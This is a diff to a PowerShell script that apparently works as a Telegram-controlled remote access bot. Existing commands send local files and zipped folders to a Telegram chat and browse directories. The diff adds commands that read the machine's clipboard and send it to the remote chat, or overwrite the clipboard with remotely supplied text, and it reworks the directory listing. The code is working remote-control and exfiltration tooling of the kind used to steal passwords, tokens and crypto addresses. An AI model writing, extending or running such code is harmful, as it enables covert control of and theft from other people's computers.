@@ -186,6 +186,32 @@ function Send-TelegramFolder {
     }
 }
 
+function Get-ClipboardContent {
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        $clipboardText = [System.Windows.Forms.Clipboard]::GetText()
+        if ([string]::IsNullOrEmpty($clipboardText)) {
+            return "Clipboard is empty or contains non-text content."
+        }
+        return $clipboardText
+    } catch {
+        return "Error reading clipboard: $_"
+    }
+}
+
+function Set-ClipboardContent {
+    param (
+        [string]$text
+    )
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        [System.Windows.Forms.Clipboard]::SetText($text)
+        return $true
+    } catch {
+        return $false
+    }
+}
+
 function Send-HelpMessage {
     param ([string]$chatId)
     $helpMessage = @"
@@ -202,6 +228,8 @@ Available Commands:
 /pcname - Shows the computer name.
 /sendfile <path> - Sends a file from local disk.
 /sendfolder <path> - Sends a zipped folder from local disk.
+/getclipboard - Gets text from clipboard.
+/setclipboard <text> - Sets text to clipboard.
 cd <path> - Change directory.
 cd - Show current directory.
 ls or dir - List files and folders.
@@ -255,18 +283,25 @@ while ($true) {
             elseif ($text -match "^cd$") {
                 $reply = "Current directory: $global:CurrentDirectory"
             }
-            elseif ($text -match "^(ls|dir)$") {
-                try {
-                    $items = Get-ChildItem -Path $global:CurrentDirectory | Select-Object Name
-                    $reply = if ($items) {
-                        "Files and folders in $global:CurrentDirectory:`n" + ($items.Name -join "`n")
-                    } else {
-                        "No files or folders found in $global:CurrentDirectory"
-                    }
-                } catch {
-                    $reply = "Error reading directory: $_"
-                }
-            }
+			elseif ($text -match "^(ls|dir)$") {
+				try {
+					$items = Get-ChildItem -Path $global:CurrentDirectory
+					$reply = if ($items) {
+						$list = foreach ($item in $items) {
+							if ($item.PSIsContainer) {
+								"[Folder] $($item.Name)"
+							} else {
+								"[File]   $($item.Name)"
+							}
+						}
+						"Files and folders in $global:CurrentDirectory:`n" + ($list -join "`n")
+					} else {
+						"No files or folders found in $global:CurrentDirectory"
+					}
+				} catch {
+					$reply = "Error reading directory: $_"
+				}
+			}
             elseif ($text -eq "/help") {
                 Send-HelpMessage -chatId $chatId
                 continue
@@ -330,6 +365,15 @@ while ($true) {
                     $folderPath = Join-Path $global:CurrentDirectory $folderPath
                 }
                 $reply = Send-TelegramFolder -chatId $chatId -folderPath $folderPath
+            }
+            elseif ($text -eq "/getclipboard") {
+                $clipboardContent = Get-ClipboardContent
+                $reply = "Clipboard content:`n$clipboardContent"
+            }
+            elseif ($text -match "^/setclipboard\s+(.+)$") {
+                $clipText = $matches[1]
+                $success = Set-ClipboardContent -text $clipText
+                $reply = if ($success) { "Text set to clipboard: $clipText" } else { "Failed to set clipboard text." }
             }
             else {
                 $reply = "Unknown command."
